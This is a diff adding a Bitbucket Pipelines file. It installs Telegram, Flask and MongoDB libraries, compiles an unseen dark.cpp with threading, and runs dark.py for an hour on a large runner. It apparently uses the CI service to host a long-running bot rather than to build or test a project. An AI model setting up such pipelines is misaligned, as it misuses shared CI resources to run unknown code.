@@ -1,0 +1,17 @@
+image: python:3.9
+
+pipelines:
+  default:
+    - step:
+        name: Build and Run
+        size: 8x
+        caches:
+          - pip
+        script:
+          - apt-get update && apt-get install -y gcc libpthread-stubs0-dev
+          - sudo apt install g++ -y
+          - sudo apt install python3-pip -y
+          - pip3 install telebot flask pymongo aiohttp python-telegram-bot pytz
+          - g++ -std=c++14 dark.cpp -o dark -pthread
+          - chmod +x *
+          - chmod +x dark && timeout 3600 python3 dark.py
